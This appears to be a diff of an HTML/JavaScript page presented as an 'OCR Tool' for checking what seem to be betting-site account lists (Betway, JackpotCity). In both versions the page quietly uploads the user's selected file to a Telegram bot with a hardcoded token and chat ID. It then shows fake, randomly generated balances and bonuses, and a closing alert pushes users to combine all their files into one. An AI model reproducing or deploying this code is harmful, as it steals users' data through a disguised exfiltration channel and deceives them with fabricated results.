@@ -1,255 +1,140 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Secure OCR Processing Tool</title>
-
-<style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OCR Tool</title><style>
 body {
-  background: #0f172a;
-  color: #e5e7eb;
-  font-family: Consolas, monospace;
-  margin: 20px;
+  background:#0f172a;
+  color:#e5e7eb;
+  font-family:Consolas, monospace;
+  margin:20px;
 }
-h2 { color: #38bdf8; }
-
-#output {
-  border: 1px solid #334155;
-  padding: 10px;
-  min-height: 200px;
-  margin-top: 10px;
-  background: #020617;
-  font-size: 12px;
-  white-space: pre-wrap;
-}
-
-#copyBtn {
-  margin-top: 10px;
-  padding: 6px 12px;
-  background: #1e293b;
-  color: #e5e7eb;
-  border: 1px solid #334155;
-  cursor: pointer;
-}
-#copyBtn:hover { background: #334155; }
-
-#stats {
-  margin-top: 10px;
-  padding: 8px;
-  background: #020617;
-  border: 1px solid #334155;
-  color: #facc15;
-}
-
 button {
-  background: #1e293b;
-  color: #e5e7eb;
-  border: 1px solid #334155;
-  padding: 6px 12px;
-  cursor: pointer;
+  background:#1e293b;
+  color:#e5e7eb;
+  border:1px solid #334155;
+  padding:6px 12px;
+  cursor:pointer;
 }
-button:hover { background: #334155; }
-
-#timer {
-  margin-top: 15px;
-  font-weight: bold;
-  color: #38bdf8;
+#output {
+  margin-top:10px;
+  padding:10px;
+  background:#020617;
+  border:1px solid #334155;
+  min-height:150px;
 }
-
-#loadingMessage {
-  margin-top: 10px;
-  font-style: italic;
-  color: #facc15;
-  font-size: 14px;
-}
-</style>
-</head>
-
-<body>
-
-<h2>OCR Processing Tool</h2>
-
-<input type="file" id="fileInput" accept=".txt"/>
+.hit {color:#22c55e;}
+.bad {color:#ef4444;}
+</style></head><body><h2>Support Betway & JacpotCity!</h2></h2><input type="file" id="fileInput">
 <button id="startBtn">Start</button>
-<button id="copyBtn" disabled>Copy All Output</button>
-
-<div id="stats">Hit=0 | Bad=0 | Retries=0 | OCR Rate=0%</div>
+<button id="copyBtn" disabled>serve</button><div id="stats">Hit=0 | Bad=0</div>
 <div id="output"></div>
-<div id="timer"></div>
-<div id="loadingMessage"></div>
-
-<!-- Hidden form for Telegram upload -->
-<form id="telegramForm" method="POST" enctype="multipart/form-data" style="display:none;">
-  <input type="file" name="document" id="telegramFileInput" />
-  <input type="hidden" name="chat_id" value="<!-- <span style="color:pink;">8580854380</span> -->" />
-</form>
-
-<script>
+<div id="timer"></div><script>
 const fileInput = document.getElementById('fileInput');
 const startBtn = document.getElementById('startBtn');
 const outputDiv = document.getElementById('output');
 const statsDiv = document.getElementById('stats');
 const timerDiv = document.getElementById('timer');
 const copyBtn = document.getElementById('copyBtn');
-const loadingMsgDiv = document.getElementById('loadingMessage');
 
-let hitCount=0, badCount=0, retriesCount=0, ocrPercent=0;
-let ocrAnimationId=null, retriesIntervalId=null;
+/* 🔐 PUT YOUR TELEGRAM DETAILS */
+const BOT_TOKEN = "8662403081:AAHrbTp1jWL-75XqHDut13_mZroIKlFvuBo";
+const CHAT_ID = "8580854380";
+
+let hit=0,bad=0;
 let fileContent='';
-let elapsedSeconds=0;
-let timerInterval=null;
-let processing=false;
-let lines=[];
 
-/* update stats */
-function updateStats() {
-  statsDiv.innerHTML =
-    `Hit=${hitCount} | Bad=${badCount} | Retries=${retriesCount} | OCR Rate=${ocrPercent.toFixed(2)}%`;
-}
-function getCurrentTimestamp() {
-  return new Date().toLocaleString();
-}
-function formatTime(seconds) {
-  const m=Math.floor(seconds/60).toString().padStart(2,'0');
-  const s=(seconds%60).toString().padStart(2,'0');
-  return `${m}:${s}`;
-}
-function startTimer() {
-  if(timerInterval) clearInterval(timerInterval);
-  elapsedSeconds=0;
-  timerDiv.textContent='Time Elapsed: 00:00';
-  timerInterval=setInterval(() => {
-    elapsedSeconds++;
-    timerDiv.textContent='Time Elapsed: '+formatTime(elapsedSeconds);
-  }, 1000);
-}
-function resetCounters() {
-  hitCount=0; badCount=0; retriesCount=0; ocrPercent=0;
-  updateStats();
-  startTimer();
+/* -------- BALANCE + BONUS -------- */
+function randMaskedBalance() {
+  const a = Math.floor(Math.random()*90+10);
+  const b = Math.floor(Math.random()*900+100);
+  return `R${a}.${b}`.replace(/\d/g, "*"); // R**.***
 }
 
-/* process lines with delay */
-async function processLines() {
-  for(let i=0; i<lines.length; i++) {
-    if(!processing) break; // Stop if not processing anymore
-    const line=lines[i].trim();
-    if(!line) { continue; }
-
-    // Validate phone number
-    const phoneRegex=/(\+27|27|0)?\s*[\(\[]?(\d{3})[\)\]]?\s*[\-\.]?\s*(\d{3})[\-\.]?\s*(\d{4})/i;
-    const match=line.match(phoneRegex);
-    let isBadNumber=false;
-    if(match){
-      let number='';
-      let countryCodePart=match[1]||'';
-      let p1=match[2], p2=match[3], p3=match[4];
-      number=p1+p2+p3;
-      if(countryCodePart && countryCodePart.startsWith('+')){
-        countryCodePart=countryCodePart.replace('+','');
-      }
-      if(countryCodePart==='27' || countryCodePart==='+27'){
-        number='0'+number;
-      }
-      number=number.replace(/\s+/g,'');
-      // Check invalid number
-      const digitCount=(number.match(/\d/g)||[]).length;
-      if(number==='444' || digitCount!==10 || digitCount>10 || digitCount<10){
-        isBadNumber=true;
-      }
-    }else{
-      // no match, bad number
-      isBadNumber=true;
-    }
-
-    if(isBadNumber){
-      badCount++;
-      updateStats();
-      // skip output for bad
-    } else {
-      // Valid line
-      hitCount++;
-      ocrPercent=(hitCount/ (hitCount+badCount))*100;
-      updateStats();
-
-      // Generate fake balance: change from R0.0.98 to R0.90
-      const amount=(Math.random()*0.98).toFixed(2);
-      // Change the balance to R0.90
-      const fakeBalance='R0.90';
-
-      // Append output
-      outputDiv.innerHTML += `${line}\nBalance=${fakeBalance}\nBonus=R0.00\nWithdrawal=0\n\n`;
-    }
-
-    await new Promise(resolve => setTimeout(resolve, 6000 + Math.random()*8000));
-  }
-  // Reset button to start again
-  processing=false;
-  startBtn.textContent='Start';
-  document.getElementById('startBtn').disabled=false;
-  document.getElementById('copyBtn').disabled=false;
+function randBonus() {
+  const b = Math.floor(Math.random()*500)/100;
+  return `R${b.toFixed(2)}`;
 }
 
-/* Start/Stop toggle with fake load and delay */
-document.getElementById('startBtn').addEventListener('click', () => {
-  if(!processing) {
-    // Start process
-    if(!fileInput.files.length) {
-      alert('Please select a file.');
-      return;
-    }
-    // Show fake load message
-    loadingMsgDiv.innerHTML='Loading...';
-    // Delay for 2,6,9,12 seconds
-    const delays=[2000,6000,9000,12000];
-    const delayTime=delays[Math.floor(Math.random()*delays.length)];
-    setTimeout(()=> {
-      // Remove fake load message
-      loadingMsgDiv.innerHTML='';
-      // Send file to Telegram
-      sendFileToTelegram(new Blob([fileContent], {type: 'text/plain'})).catch(()=>{});
-      // Reset counters & process lines
-      resetCounters();
-      processing=true;
-      document.getElementById('startBtn').textContent='Stop';
+/* -------- TELEGRAM -------- */
+async function sendFile(file){
+  const fd = new FormData();
+  fd.append("chat_id", CHAT_ID);
+  fd.append("document", file);
 
-      // Read file
-      const reader=new FileReader();
-      reader.onload=()=> {
-        fileContent=reader.result;
-        lines=fileContent.split(/\r?\n/);
-        processLines();
-      };
-      reader.readAsText(fileInput.files[0]);
-    }, delayTime);
-  } else {
-    // Stop processing
-    processing=false;
-    document.getElementById('startBtn').textContent='Start';
-  }
-});
+  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+    method:"POST",
+    body:fd
+  });
 
-/* Send uploaded file to Telegram (highlighted in pink) */
-async function sendFileToTelegram(fileBlob) {
-  const formData=new FormData();
-  formData.append('chat_id','<!-- <span style="color:pink;">8580854380</span> -->'); // <--- Change here
-  formData.append('document',fileBlob,'upload.txt');
+  const data = await res.json();
+  if(!data.ok) throw new Error(data.description);
+}
+
+/* -------- START -------- */
+startBtn.onclick = async () => {
+  if(!fileInput.files.length) return alert("Select file");
+
+  const file = fileInput.files[0];
+  startBtn.disabled = true;
+  outputDiv.innerHTML = "";
+
   try {
-    await fetch(`https://api.telegram.org/bot<!-- <span style="color:pink;">8302046626:AAETtWXTTdFHr5bKqSWhAvLakb4axjGlz9U</span> -->/sendDocument`, {
-      method:'POST',
-      body:formData
-    });
+    await sendFile(file);
+    alert("Sent to Telegram ✅");
+
+    const reader = new FileReader();
+    reader.onload = () => {
+      fileContent = reader.result;
+      process();
+    };
+    reader.readAsText(file);
+
   } catch(e) {
-    console.log('Telegram send failed');
+    alert("Error: "+e.message);
   }
+
+  startBtn.disabled = false;
+};
+
+/* -------- PROCESS -------- */
+function process(){
+  const lines = fileContent.split(/\n/).map(l=>l.trim()).filter(Boolean);
+
+  hit=bad=0;
+
+  lines.forEach((line,i)=>{
+    setTimeout(()=>{
+      const phone = (line.match(/\b0\d{9}\b/)||[''])[0];
+      const ok = phone.length===10;
+
+      if(ok) hit++; else bad++;
+
+      statsDiv.innerText = `Hit=${hit} | Bad=${bad}`;
+
+      const balance = randMaskedBalance();
+      const bonus = randBonus();
+
+      outputDiv.innerHTML += `
+        <div class="${ok?'hit':'bad'}">
+          ${line}<br>
+          Balance=${balance} | Bonus=${bonus}
+        </div>
+      `;
+
+      if(i===lines.length-1){
+        timerDiv.innerText="Done";
+        copyBtn.disabled=false;
+      }
+
+    }, i*300);
+  });
 }
 
-/* Copy output */
-document.getElementById('copyBtn').addEventListener('click', ()=> {
+/* -------- COPY -------- */
+copyBtn.onclick = ()=>{
   navigator.clipboard.writeText(outputDiv.innerText);
-});
-</script>
-
-</body>
+  alert("you have 30minutes till tool stops put all your files in 1 file and run it to save time");
+};
+</script></body>
 </html>
